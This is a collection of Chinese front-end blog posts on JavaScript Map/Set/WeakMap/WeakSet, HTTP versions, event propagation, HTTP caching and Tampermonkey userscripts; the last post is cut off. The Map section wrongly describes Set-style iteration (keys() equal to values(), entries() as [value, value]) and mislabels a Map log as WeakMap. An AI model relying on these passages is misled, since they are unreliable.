[{"content":" 參考網站\n參考網站\n參考網站\n參考網站\nES6 推出了 Map 物件，讓開發者可以透過這個特製資料結構進行鍵值對(key-value pairs)的操作。然而 JavaScript 原始物件(plain object)就可以用來做鍵值對的操作，為什麼還需要 Map 物件呢？ Map 物件解決了什麼問題？那與 Set 又有什麼不同呢？本篇來詳細說明一下。\nMap 與 object 的差別 原始物件的鍵(key)只可以是字串，但 Map 的鍵可以是任何東西 在用鍵值對處理資料時，很常開發者會用各類東西做為鍵(key)，但是在 JavaScript，如果用原始物件，不管用什麼當做鍵，都會被轉換成字串，這往往會造成一切錯誤，例如被轉成字串時，原本兩格不同的鍵被轉成同樣的字串，這就導致撞鍵問題。而 Map 物件解決了這個問題，開發者想用什麼當鍵都可以。\n原始物件不支援迭代(iteration)，但 Map 物件有 過去我們沒辦法直接對一個原始物件用 for...of、forEach 來迭代，而是需要用額外的方法，例如 Object.entries、Object.keys 來協助。但是 Map 物件是可迭代的(iterable)，所以我們可以直接對 Map 物件用 for...of、forEach。\n原始物件的元素沒有順序性，Map 物件則有順序 上面提到 Map 物件是可迭代的，它有一個相關的優點是在迭代時是有順序性的。過去用原始物件，即使用用物件方法 (例如 Object.entries、Object.keys 來協助迭代)，迭代出的結果順序不一定會是我們放入鍵值對的順序。\n但有時候在寫演算法時，我們需要保留順序，這時 Map 物件就會好用很多。\nMap 提供許多鍵值對常用的方法，但原始物件沒有 舉例來說，如果要知道一個鍵值對的大小，Map 有 size 方法，簡單又好用；但如果用原始物件，我們可能需要使用 Object.keys 然後搭配 .length 去自己找該物件有多少個鍵，這就麻煩很多。\n另外 Map 也有提供 clear 方法，可以一次把所有鍵值對刪掉；如果是原始物件就需要一個一個刪。\nMap 類似於 Object 的資料結構，都是用鍵與值(key-value pair)的形式儲存資料格式，但還是有許多差異。\nMap 本身是一種構造函式，用來生成 Map 這種數據結構，具體做法是 new Map() 來生成實例。\n常見操作方法 Map 常見操作方法有\nset(key, value)： Map 新增元素。 get(key)： 透過鍵(Key)查詢特定元素，並返回。 has(key)： 判斷 Map 中是否存在某鍵(key)。 delete(key)： 透過鍵(Key)從 Map 中移除特定元素。 size： 方法得到元素的數量。 常見遍歷方法 Map 常見遍歷方法(遍歷順序會是插入順序)\nvalues()： 返回 Map 中所有元素的值。 keys()： 方法等同於 values()。 entries()： 返回 Set 中所有的元素，因在 Set 中沒有鍵值(Key)，返回的元素會是 [value, value] 的形式。 Map 和 WeakMap 的區別 WeakMap 的方法和使用部分與 Map 資料結構相近，本區塊會專注在這兩者不同之處。\nWeakMap 只允許物件(Object) 作為鍵名(key)，但是 null 除外。而 Map 則是可接受各種資料類型作為鍵名(key)。 WeakMap 中的鍵名是**「弱引用」(weak reference)**，鍵名(key)所指向的對象可以被垃圾回收，此時的鍵名(key)是無效的。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 如果放入的物件在外面沒有其他引用，在 WeakMap 中會被垃圾回收掉 let food = new WeakMap(); let fruit = { name: \u0026#39;apple\u0026#39; }; food.set(fruit, \u0026#39;good\u0026#39;); // 將 apple 物件置入 WeakMap 中 fruit = null; // 移除 apple 的引用 console.log(food); // WeakMap(0) fruit 已經被垃圾回收，因此 WeakMap 中沒有項目 // 一般的 Map，即使放入的物件在外面沒有其他引用，仍在 Map 當中存放 let food = new Map(); let fruit = { name: \u0026#39;apple\u0026#39; }; food.set(fruit, \u0026#39;good\u0026#39;); console.log(food); // WeakMap(1) fruit = null; console.log(food); // WeakMap(1) fruit 不會被垃圾回收 在上方的強引用程式碼中，雖然 fruit 物件最後被重新賦值為 null (意思等同於無法再透過 fruit 變數獲取該對象值，因為其中的引用被斷開)，但由於 food 與此物件間存在強引用，所以被保留在記憶體中，這就是前面提到的，強引用會防止物件被垃圾回收，並將物件保留在記憶體當中； 弱引用則相反，並不能防止物件被垃圾回收，當 JavaScript 執行環境執行垃圾回收時，上述弱引用例子中的 fruit 物件會被從記憶體和 WeakMap 中刪除。\n弱引用的適用情境在於，如果引用的物件在未來可能會被刪除的情況、且不想防止被垃圾回收時，就適合用 WeakMap 或 WeakSet。例如，如果我們想要記錄一些與 DOM 節點相關的數據，有一種方法是使用 Expando 擴充節點上的資訊，但壞處是會直接修改到這個 DOM 節點、且如果未來這個節點被移除時，相關資訊不會被垃圾回收掉，這時如果是使用 WeakMap 就會是很好的替代方案。\n備註： 如果直接將弱引用程式碼的例子在 JavaScript 執行環境中執行，可能還是會看到 WeakMap 中有值，這是因為 JavaScript 執行環境會在特定的時間點執行垃圾回收。\nSet Set 這個數據結構類似陣列，但是裡面的元素值都是唯一，不會有重複的值，無論此值是原始型別(primitive values)或引用型別(object references)。在 JavaScript 當中，Set 本身是一種構造函式，用來生成 Set 這種數據結構，具體的做法是透過 new Set() 來生成實例。\n常見操作方法 Set 常見操作方法有\nadd(value)： 用來新增值。 delete(value)：用來刪除每個 Set 中的值。 has(value)：判斷 Set 中是否存在每個值。 size： 方法得到元素的數量，與陣列使用 arr.length 方法不一樣。 Set 中沒有鍵值(Key)，如果使用 entries() 遍歷，返回的元素會是 [value, value] 的形式。\n1 2 3 4 5 6 7 8 9 10 11 const set1 = new Set(); set1.add(42); set1.add(\u0026#39;forty two\u0026#39;); const iterator1 = set1.entries(); for (const entry of iterator1) { console.log(entry); // expected output: [42, 42] // expected output: [\u0026#34;forty two\u0026#34;, \u0026#34;forty two\u0026#34;] } Set 和 WeakSet 的區別 WeakSet 的方法和使用部分與 Set 資料結構相近，本區塊會專注在這兩者不同之處。\nWeakSet 內的元素值只允許是物件(Object)，但 Set 可接受各種資料類型的值。 1 2 3 4 5 6 7 const wSet = new WeakSet(); const a = [1, 2, 3]; const b = { name: \u0026#39;explainthis\u0026#39; }; wSet.add(a); // WeakSet {Array(3)} wSet.add(b); // WeakSet {{...}} wSet.add(1); // Uncaught TypeError: Invalid value used in weak set WeakSet 內的元素都是**「弱引用」(weak reference)**，可以被垃圾回收機制回收。假如使用 Set ，即使某個被存入的值，在其他地方已經沒有被引用，該值仍會存在於 Set 當中，不會被垃圾回收。但如果是 WeakSet，則會被垃圾回收。如果要更有意識地做記憶體管理，WeakSet 在許多時候能派上用場。 1 2 3 4 5 6 7 const disableElements = new WeakSet(); const loginButton = document.querySelector(\u0026#39;#login\u0026#39;); disableElements.add(loginButton); // 使用的時候通過查詢元素是否在集合中，就可以知道它是否被禁用。而一旦元素从DOM樹中删除， // WeakMap也會釋放其内存（為了嚴謹，假設没有其它地方引用這個對象）。 disableElements.has(loginButton); // true ","date":"2022-12-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52576483407_0c40603733_o.jpg","permalink":"https://wayneblog.ga/2022-12-21/js-map-set-difference/","title":"Javascript 中，Map、Set、WeakMap 和 WeakSet 的區別？"},{"content":" 參考網站\n參考網站\n從 1989 年起，HTTP 經歷了數代的演化，從 1 到 1.1 再到 2 以及目前的 3，這些不同版本有些什麼不同呢？不管是前端或後端的面試，都是經常會考的。這篇我們會先針對 1 到 1.1 再到 2 之間的異同處做摘要。\n出現時間 超文本傳輸協定 HTTP (HyperText Transfer Protocol) 是在網際網路中用來通信數據的基礎。HTTP 一開始的發展是從 1989 年所發起制定，其中經過幾個時期的演進，HTTP/1.1 是隨著在 1999 年 6 月公布的 RFC 2616 所發表 。HTTP/2 (最初命名為 HTTP 2.0) 則是在 2015 年 5 月以 RFC 7540 正式發表，並取代 HTTP/1.1 成為 HTTP 的實作標準。截至 2021 年 10 月，全球有 46.5%的網站支援了 HTTP/2 (wiki)。\nHTTP/1 和 HTTP/1.1 差異 往下讀之前，要先理解之所以會有 HTTP/1.1 是因為 HTTP/1 有一些不那麼理想的地方。因此建議不要死背差異，而是從「 HTTP/1.1 解決了什麼問題」出發來理解。\n持久連接 (keep-alive) HTTP/1 在發送每個請求之前都需要建立一個新的連接，而每次連接都是有成本的，這種每次重連的方式會造成很多頻寬的浪費，以及時間的延遲。而 HTTP/1.1 默認使用持久連接，讓 HTTP/1.1 可以使用同一個 TCP 連接來重複多個 HTTP 請求，這麼一來就可以避免每次重新建立連接造成的頻寬浪費、時間延遲。\n狀態碼 100 (Continue) 在某些情況下，伺服器端會拒絕客戶端發送的請求，因為發請求時可能會夾帶正文 (request body)，所以每次請求被拒絕都會造成頻寬上的額外浪費。在 HTTP/1 沒有機制避免這種類型的浪費，而 HTTP/1.1 的 100 (Continue) 狀態碼則可以協助我們避免這種浪費。具體來說，HTTP/1.1 讓使用者端先送出一個只含有標頭、不帶內文的請求到伺服器，伺服器確認沒有問題之後，會回應狀態碼 100 (Continue)；收到 100 (Continue) 後，客戶端才會正式發一個帶有正文的請求；如果沒有收到，則代表伺服器端不接受該請求，這讓客戶端知道伺服器端不接受，這能讓客戶端可以避免發帶有正文的請求，進而減少傳輸上的頻寬浪費。(詳細請見 RFC 的這個段落)。\n快取緩存 HTTP/1 主要使用標頭中的 If-Modified-Since、Expires 來做為緩存的判斷標準，這兩者都是以時間作為依據；HTTP/1.1 則引入更多的緩存策略，例如：Etag、If-Unmodified-Since、If-Match、If-None-Match，透過這些可以更優化緩存的實現 (這些標頭的使用在面試也很常考，詳見這篇文章)。\nHost 字段 HTTP/1.1 增加了 Host 字段，用來指定伺服器的域名。在 HTTP/1 中，會認為每台伺服器都綁定唯一的 IP 地址，因此請求當中的 URL 並沒有傳遞主機名(hostname)。但隨著之後虛擬主機技術的演進，現在在一台伺服器上可以存在多個虛擬主機，並且他們會共享同一個 IP 地址。所以有了 host 字段之後，就可以將請求發往同一台伺服器上的不同網站。\n更多請求方法 HTTP/1.1 相對於 HTTP/1 新增了許多請求方法，現今我們常用的 PUT, PATCH, DELETE, CONNECT, TRACE 和 OPTIONS 等都是在 HTTP/1.1 時新增的。\nHTTP/2 和 HTTP/1.1 比較 多路復用(Request multiplexing) 來解決頭部阻塞 (head-of-line blocking) HTTP/1.1 使用了 pipelining 的機制，這可以讓客戶端在同一個 TCP 連接內並行發出多個 HTTP 請求，客戶端也不需要等待上一次請求結果返回，就可以發出下一次請求，但伺服器端必須依照接收到的客戶端請求的先後順序一次返回，以保證客戶端能夠區分出每次請求的回應內容，但這項機制在實作上較難實現，因此各家瀏覽器，都將此功能預設為關閉。(可以參考此篇 stackoverflow)。此外 pipeline 也造成頭部阻塞(head-of-line blocking ( HOL ))問題，如果有任一個請求要操作很久或傳輸包流失，那就會阻塞整個 pipeline 的工作。\nHTTP/2 引進了多路復用的機制，讓同一個 TCP 連接中，同時發送和接受多個請求，並且不用等到前一個請求收到回應，透過這個機制，解決了過往在 HTTP 層級的的頭部阻塞問題 (備註：但 TCP 層級仍有頭部阻塞問題，這會在 HTTP/3 被解決)。\n優先請求順序 HTTP/2 版本中，每個請求或回應的所有數據包，稱之為一個數據流，並且，每個數據流擁有一個唯一編號 ID (stream ID)。每個數據包在發送的時候就會戴上對應的數據流編號 ID，客戶端還能指定數據流的優先級，優先級越高服務器也會越快做出回應。\n標頭(Header)訊息壓縮 在 HTTP/2 之前因為安全性問題，多數不會對標頭的訊息進行壓縮，主要是過去的採用的演算法可能遭受 CRIME 攻擊。在 HTTP/2 中，使用 HPACK 算法來避免攻擊，進而能壓縮標頭。因為壓縮標頭，讓傳輸時能大幅減少傳輸的訊息量，進而減少頻寬負擔，也增快傳輸速度。具體上 HPACK 使用一份索引表來定義常用的 http header，並把 http header 存放在表裡，請求的時候只需要發送在表裡的索引位置即可，不須用傳完整的標頭。\n伺服器主動推送(Server push) HTTP/2 允許伺服器端主動向客戶端推送數據，這能協助減少客戶端的請求次數。舉例來說，瀏覽器在過去要請求 index.html 與 style.css 來渲染完整的畫面；透過 Server Push，可以在瀏覽器請求 index.html 時，也由伺服器主動發送 style.css ，這樣只需要一輪 HTTP 的請求，就可以拿到所需的所有資源。\n","date":"2022-12-19T00:10:00Z","image":"https://live.staticflickr.com/65535/52571909202_4ddc6d0335_o.jpg","permalink":"https://wayneblog.ga/2022-12-19/browser-http1.0-http1.1-http2.0-difference/","title":"面試常見的瀏覽器問題(三) - HTTP/1、HTTP/1.1 和 HTTP/2 的區別"},{"content":" 參考網站\n參考網站\n當使用者與瀏覽器互動時，會觸發各類不同的事件(event)，例如常見的點擊(click)、滑動(scroll)。我們可以透過 JavaScript 的事件處理器(handler)，來處理這些事件。讓我們能在事件觸發時，做出我們要的效果，例如點擊某個按鈕，觸發某個邏輯。\n針對瀏覽器事件，最常見的考題之一，便是事件委派、事件捕獲、事件冒泡，是很常見的面試考題。以下將用第一人稱的擬答，來回答「請說明瀏覽器中的事件委派、捕獲、冒泡」這個問題。\n事件委派 事件委派是當我們想要在一群子元素中，都加上同樣的事件監聽器與處理器時可以派上用場。當我們有許多相同元素，有相似的行為時，我們可以不用在每個元件都加上處理器，而是可以直接在父層加上處理器。這時透過 event.target 來得知實際上是哪一個元素發生事件，並處理該事件。\n這種把監聽器與處理器裝在父層，然後委派給子元素，就是所謂的事件委派。\n這麼做的好處是，我們不用在每個元件，例如每個按鈕上都加上處理器，這可以減少記憶體消耗；這也讓我們的架構更彈性，可以隨時新增或移除元素。也可以寫比較少的程式碼，讓可閱讀性提升。\n舉例來說 (編按：此例子來自 MDN)，如果想要在一長串列表中的每個項目，都加上處理器，我們可以直接加在父層，不用每個子元素都加上，就算今天有上百上千個子元件都是。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;div id=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;; 1 2 const container = document.querySelector(\u0026#39;#container\u0026#39;); container.addEventListener(\u0026#39;click\u0026#39;, (event) =\u0026gt; (event.target.style.backgroundColor = bgChange())); 事件捕獲 事件委派之所以能夠發生，是因為在背後的事件捕獲與冒泡機制。一般來說，當事件觸發時，會先進入捕獲階段，然後到達事件目標，接著才是冒泡階段。(建議在面試時，可以簡單手繪這張 W3C 的事件流程，會更加幫助說明唷！)\n從上圖可得知，所謂的捕獲階段是指：當某個事件觸發時，例如使用者點了某個按鈕，此時由 DOM 樹的最上層 Window 一路往下，將事件傳遞下去並執行。實際在程式碼上，需要在事件監聽器中，加入 {capture: true} 來開啟捕獲機制。\n事件冒泡 冒泡階段則是比較常用的，跟捕獲階段相反，它是先在目標上執行事件處理器，接著傳遞到父層，再傳到祖父層，然後一路傳上去。\n1 2 3 4 5 6 7 \u0026lt;form onclick=\u0026#34;alert(\u0026#39;form 點擊事件觸發\u0026#39;)\u0026#34;\u0026gt; 這是一個 form 元素 \u0026lt;div onclick=\u0026#34;alert(\u0026#39;div 點擊事件觸發\u0026#39;)\u0026#34;\u0026gt; 這是一個 div 元素 \u0026lt;p onclick=\u0026#34;alert(\u0026#39;p 點擊事件觸發\u0026#39;)\u0026#34;\u0026gt;這是一個 p 元素\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; 以上面的例子來說(建議在面試時也可以簡單快速手寫這個例子，可以幫助說明)，當我們在子層 \u0026lt;p\u0026gt; 裝一個 onclick 的處理器，點下去時，不僅該元素有跑出 alert ，其父層 \u0026lt;div\u0026gt; 的 onclick 也被觸發，然後祖父層 \u0026lt;form\u0026gt; 的 onclick 也接續被觸發。\n這邊有個細節需要分別，在冒泡時的 this 不必然等於 event.target，而是會等於 event.currentTarget。換句話說，this 是正在執行的處理器 (會一直變成下一個)；而 event.target 一直都會是真正變點擊的那個(在這邊就是最裡頭的子層)。\n在實務上，我們有時候不想要冒泡，例如只想要子元素的事件被觸發，不想要父層的元素被觸發，避免干擾。這時候想要不發生冒泡，可以在處理器加上 event.stopPropagation()(不過這個仍會讓該處理器執行，只是不會冒泡上去)；如果連該處理器的其他事件類別都不想執行的話，可以用 event.stopImmediatePropagation()。\n","date":"2022-12-19T00:05:00Z","image":"https://live.staticflickr.com/65535/52571751437_6018c4804c_o.jpg","permalink":"https://wayneblog.ga/2022-12-19/browser-delegation-capture-bubble/","title":"面試常見的瀏覽器問題(二) - 事件委派、捕獲、冒泡"},{"content":" 參考網站\n參考網站\n如果要加快網頁應用程式的速度，caching 是個經常被用的策略 (caching 中文有被翻譯成緩存或快取，但因為工作與面試時都還是會說 caching 居多，這篇就暫不翻譯這個詞了)。當我們已經跟後端請求過某個資源，例如某筆資料或某張圖片，下一次再次請求時，如果該資源沒有改變，這時再次請求會相對浪費網路頻寬；反之，如果第一次請求來的資源已經被存下來，那麼下次請求時，可以直接用該資源，這樣可以減少不必要的請求。而這也是 caching 的概念。\ncaching 可以被應用在很多地方，AWS 的這篇文章中有概略分析到，在客戶端、DNS、伺服器、資料庫等地方都可以做 caching。而身為前後端工程師，在面試中很常被問到的是 HTTP 的 caching 機制。透過本篇文章，希望讓大家下次面試時被問到「請說明 HTTP caching 機制」時，可以解釋地夠清楚與完整。\nHTTP caching 是用在哪？ 為什麼要用 HTTP caching？ 可以把 cache 理解成某個我們暫時存放資源(例如某筆資料、某張圖片)的地方，所以當下次需要這些資源時，不用再請求一次，而是可以直接從 cache 這個暫存處拿到。換到 HTTP caching 的脈絡，這個暫存的地方就是瀏覽器。\n舉例來說，當今天使用者逛了 LV 的官網，官網中的商品圖片與價錢，不太會快速改變，換句話說現在逛跟一小時後逛，看到的資訊很可能是完全一樣的。\n這時當第一次逛網站時，前端跟伺服器請求了這些商品圖片、描述與價錢，把他們 cache 起來 (放在瀏覽器記憶體的某個地方)，當使用者下次逛的時候，就不需要再跟伺服器請求了。下面這張是來自 MDN 的圖示，可以看到，如果沒有 cache，每一次請求都要對到伺服器；然而如果有 cache，則可以從 cache 裡面拿，可以減少直接對伺服器的請求：\n讀到這邊我們可以歸納出，這麼做有幾項 caching 好處，也是我們為什麼要用 caching 的理由：\n減少請求次數：因為不用請求，而是直接從 cache 拿出之前暫存的資料，這樣做能減少伺服器與資料庫端的負擔。 加快資源載入：向伺服器請求，需要等網路傳輸資料。直接從瀏覽器裡面的 cache 拿，就不用等這一段資料傳輸的時間，會快很多。 該如何設定 HTTP caching？ 上面談到 HTTP caching 的好處，以及可以把跟伺服器請求來的資料 cache 在瀏覽器中。但實際上該如何設定呢？這也是面試時會被追問的。\n以下有幾種方式：\nExpires 第一種方式是在 HTTP Response header 當中加入 Expires，舉例來說：\n1 Expires: Tue, 18 Jul 2022 16:07:23 GMT 瀏覽器收到該回應的資料會先把資料存在 cache 當中，而下一次用戶發送相同請求時，瀏覽器會去判斷現在時間是否已經到了 Expires 設定的時間，如果還沒到，那就會直接從 cache 裡面拿資料，而不是發送請求。\ncache-control 由於 Expires 是比較舊的方法，現在比較少人會用，更多人會用 cache-control。cache-control 的設定方式不是直接設定一個 cache 過期的時間點，而是設定 cache 有效的時間。舉例來說，下面這段是設定 cache 有效期是 60 秒。所以在第一次請求拿到回應後的六十秒內，如果在發送相同請求，瀏覽器都會直接拿 cache 的資料，而不是發請求到伺服器端：\n1 cache-control: max-age=60 cache-control 快問快答 關於 cache-control 的設定，有一些面試常會被問的快問快答，以下列出題目。下面會有答案，不過大家可以先自己想想看，看看自己知不知道這些問題的回答。\n如果只想讓客戶端 cached，而不想讓中間層的代理伺服器等其他層 cached，該用什麼？ 反之，如果想讓代理伺服器也能夠 cached 從後端來的資料，該用什麼？ 因為很多時候瀏覽器可能會自動 cache，如果完全不想要有 cache，想要內容一直都是最新的，那又該用什麼 cache-control: no-store 跟 cache-control: no-cache 兩者有什麼差別？ 上面的問題的回答分別是：\ncache-control: private cache-control: public cache-control: no-store cache-control: no-store 是指不要 cache，而 cache-control: no-cache 則是指會 cache，不過每一次請求時都要重新驗證一次 (revalidate)，換句話說每次都還是會問伺服器內容有沒有更新，沒更新就用 cache 的。詳見這篇討論。\nHTTP caching 過期後，該如何重新驗證？ 上面提到我們可以透過 cache-control: max-age 來設定多久後 cache 過期；不過當 cache 過期後就要直接跟伺服器請求嗎？\n如果 cache 過期了，但其實伺服器那邊的資料並沒有更新，換句話說 cache 還是可以繼續被使用，這時有沒有什麼方法可以避免我們直接重新請求，繼續使用 cache？\n有的，這又被稱為驗證 (validation)，而 HTTP caching 有兩種主要方式可以做到這件事。\nETag (搭配 If-None-Match) 第一個方式是在回應的 header 當中放入 ETag (entity tag 的簡寫)。這個 ETag 會是一個獨特的值，例如 ETag: \u0026ldquo;686897696a7c876b7e\u0026rdquo;；如果後端的資料有變動，則 ETag 會改變。如果伺服器在回傳的 header 中有放入 ETag， 則之後瀏覽器在請求時，會在請求的 header 帶上 If-None-Match 欄位，而欄位的值會是之前收到的 ETag 的獨特值。\n這時後端收到了該請求，並去查看 If-None_match 當中的 ETag 跟現在的 ETag 是不是一樣的。如果是一樣的，就代表後端的資料沒變(因為如果資料有變，則 ETag 會跟著變)；這時只需用傳個 304 Not Modified 給前端，瀏覽器收到 304 後，就知道資料沒變，所以可以繼續用 cache 的。\n而如果後端比較了 ETag 發現改變，那就不是回傳 304，而是回傳一包新的資料。\nLast-Modified (搭配 If-Modified-Since) 第二個方式則是在伺服器的回應 header 中加入 Last-Modified，並標注最後修改該資源的時間，例如 Last-Modified: 2021-11-07 21:32:16。\n當瀏覽器收到帶有 Last-Modified 的回應後，之後的請求就會帶上 If-Modified-Since，然後帶上先前收到的時間，例如 If-Modified-Since: 2021-11-07 21:32:16。伺服器收到帶有 If-Modified-Since 的請求，比對了時間，如果更新資源的時間沒有變，拿一樣可以回傳 304 Not Modified 給前端，如果變了則回傳 200 以及新的資料。\n","date":"2022-12-19T00:00:00Z","image":"https://live.staticflickr.com/65535/52571693467_4bcdc4d080_o.png","permalink":"https://wayneblog.ga/2022-12-19/browser-http-caching/","title":"面試常見的瀏覽器問題(一) - HTTP caching 機制"},{"content":" 參考網站\n參考網站\n油猴腳本運行於油猴插件之上，油猴插件本質上對瀏覽器能力的再封裝。既然如此，我們先來簡單了解一下瀏覽器插件。\n瀏覽器插件(Browser Extension)：瀏覽器的擴展應用 說的直白一點，就是拿著瀏覽器開放的能力(插件API)，去實現一些小型應用。\n瀏覽器插件主要由四部分構成：background scripts、content scripts、全局 UI 元素、options page。\nbackground scrips: 後台腳本，一個後台腳本是一個獨立線程，是游離於各個頁面之外的\u0026quot;上帝之眼\u0026quot;。具有訪問各類插件 API 的能力，但同時也喪失了直接操作頁面的能力。 content scripts：內容腳本，具有直接操作頁面的能力。其實就是在頁面中運行 js 腳本，可以使用 DOM API。content script 只能直接訪問少量插件 API，但能和 background script 進行雙向通信完成數據交換。 全局 UI 元素：瀏覽器層的UI 交互，包括： 在 Toolbar 顯示 icon，定義點擊 icon 後顯示的 Popup 或其他效果 增加右鍵選項 增加全局快捷鍵 改造新Tab 頁、歷史記錄頁、書籤頁 options page：插件配置頁。 瀏覽器插件的核心機制可以用下圖簡單概括：\n想必，大家最好奇的還是有哪些 API 以及能用這些 API 做什麼，這裡例舉幾個：\ncontextMenus：增加右鍵選項。 使用選中文本，例如：劃詞翻譯、文本收集 快速調用插件功能，例如：打開 DevTool，頁面剪藏 cookies：增刪改查 cookie(任意域名)，直接拿著本地 cookie 發送請求，不必再做授權。同時由於後台腳本不是 Web 頁面，在發送請求時沒有跨域限制。 多平台信息聚合 多平台信息分發 devtools.panels：增加 Devtool 面板，這個對前端開發者來說應該很熟悉，React Developer Tools、Vue.js devtools。 notifications：瀏覽器通知，未打開頁面的情況下進行通知，可以輔助一些工具類應用。 storage：全局保存數據，可跟隨瀏覽器帳戶同步。 這裡例舉的只是我常用的一些，只是滄海一粟，更多 API 可以查閱：\nChrome Extension API Reference 支持用於擴展Microsoft Edge API Mozilla WebExtensions API 瀏覽器插件就簡單介紹到這裡，如果有興趣繼續了解，推薦：Chrome、Edge、Mozilla三家的文檔。\n油猴插件(Tampermonkey) 瀏覽器插件可以實現各式各樣的功能，但有時候開發者只是想對某一個站點加一點點小功能，如果這也要構建環境打包上架分發，未免就太麻煩了一些；從應用市場角度來看，充斥著顆粒化的應用，市場也會擁擠繁雜不堪。\n油猴插件為輕量化腳本提供了一個平台，在線編輯器中編寫油猴腳本即時生效，通過 Github、GreasyFork 快速分發。\n在油猴插件中，content script 起到非常重要的角色，它將用戶編寫的代碼運行在頁面中，同時提供 GM_xxxx 函數封裝瀏覽器的部分能力。封裝的內部實現是和 background script 通信，驅動 background script 調用插件API。\n對油猴插件簡單了解之後，來看看如何編寫油猴腳本。\nTampermonkey API 油猴腳本由頭部和核心邏輯兩部分組成。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // ==UserScript== // @name New Userscript // @namespace http://tampermonkey.net/ // @version 0.1 // @description try to take over the world! // @author You // @match https://www.tampermonkey.net/documentation.php?ext=dhdg // @icon https://www.google.com/s2/favicons?domain=tampermonkey.net // @grant none // ==/UserScript== (function() { \u0026#39;use strict\u0026#39;; // Your code here... })(); 頭部 頭部是腳本的一些元信息、更新方式、指定運行頁面、權限聲明，逐一解釋一下：\n配置名 作用 使用技巧 @name 腳本顯示的名稱 加後綴實現國際化，例如：@name:zh-CN 指定在瀏覽器語言為中文時顯示的名稱 @namespace 腳本的命名空間，可以理解為腳本的標識 為了避免衝突一般使用 Github 倉庫地址 @version 與更新相關，當前版本 @updateURL 檢查腳本是否更新地址 配合 @version 和自動更新使用 @downloadURL 檢測到更新時，去哪下載腳本 @supportURL 遇到問題時，用戶去哪反饋 @include 腳本在哪些頁面運行 可使用正則，不支持 hashtag，多個頁面的地址聲明多個 @include 即可 @match 與 @include 類似 @exclude 腳本禁止在哪些頁面運行，優先於 @include @require 在腳本運行前引入外部 JavaScript 文件 例如：引入 jQuery @resource 聲明外部資源文件，搭配 GM_getResourceText 使用 例如：引入 html、icon @connect 聲明 GM_xmlhttpRequest 可訪問的域 必須指定才能正常請求 @grant 聲明 GM_xxx 函數的使用列表 必須先指定權限才能正常使用 @run-at 指定腳本運行時機 document-start：盡快執行document-body：當 body 掛載時執行document-end：DOMContentLoaded 觸發時執行document-idle：DOMContentLoaded 觸發後執行，也是默認設置項context-menu: 右鍵菜單項被點擊時執行 @author 作者名 @description 簡短介紹 同樣可以加後綴實現國際化，例如：@description:zh-CN @homepage 主頁地址 如果未設置並且 @namespace 是倉庫地址，默認導向倉庫地址 @icon 腳本 icon @icon64 64x64 像素的腳本 icon @antifeature 腳本是否有廣告、挖礦、數據收集等商業行為 @noframes 聲明腳本不在 iframe 中運行 核心邏輯 核心邏輯通過一個立即執行函數包裹，避免和全局作用域相互干擾。Tampermonkey 將瀏覽器的部分能力封裝為 GM_XXX 函數以供調用：\nAPI 作用 使用技巧 unsafeWindow 訪問頁面的 Window 對象 GM_addStyle(css) 創建全局樣式的快捷方式，向頁面插入 style 元素 也可以用 DOM 操作手動創建 GM_addElement(tag_name, attributes)GM_addElement(parent_node, tag_name, attributes) 向 DOM 新建元素的快捷方式 也可以用 DOM 操作手動創建 GM_log(message) 在 Console 中打印信息 console.log 的快捷方式 GM_getValue(name, defaultValue) 從存儲體中獲取數據 GM_deleteValue(name) 從存儲體中刪除數據 GM_listValues() 列舉存儲體中所有數據項 GM_addValueChangeListener 監聽數據更新 例如要使 Tab 間數據同步，可以用監聽 value 達成同步 GM_removeValueChangeListener 移除監聽 GM_getResourceText(name) 獲取 @resource 中已聲明的資源 GM_getResourceURL(name) 獲取 @resource 中已聲明的資源(base64 URI 形式) GM_registerMenuCommand(name, fn, accessKey) 在 Tampermonkey 的 popup 中增加選項 GM_unregisterMenuCommand(menuCmdId) 移除選項 GM_openInTab(url, options) 新開一個 tab 頁 GM_xmlhttpRequest(details) 使用後台腳本進行請求，自動帶上 cookie，無跨域問題，目標域需要在 @connect 中提前聲明 GM_download(details) 下載資源到本地 GM_getTab(callback) 獲取當前 tab 的 object 對象 GM_saveTab(tab) 通過 tab 的 object 對象重新打開一個 tab GM_getTabs(callback) 獲取當前存活的所有 tab 的對象，以便和其他腳本實例溝通 GM_notification 使用插件 notification API 彈出桌面通知 GM_setClipboard 複製內容到剪貼板 GM_info 獲取腳本的油猴插件的信息 完整的說明文檔：Tampermonkey documentation\n實踐：打印 \u0026ldquo;Hello, World\u0026rdquo; 做一個非常簡單的小練習：創建一個名為 \u0026ldquo;Hello\u0026rdquo; 的腳本，當進入掘金和知乎頁面時，在 Console 中打印 \u0026ldquo;Hello, World\u0026rdquo;。\n新建腳本 修改腳本名稱 指定運行地址 @match 或 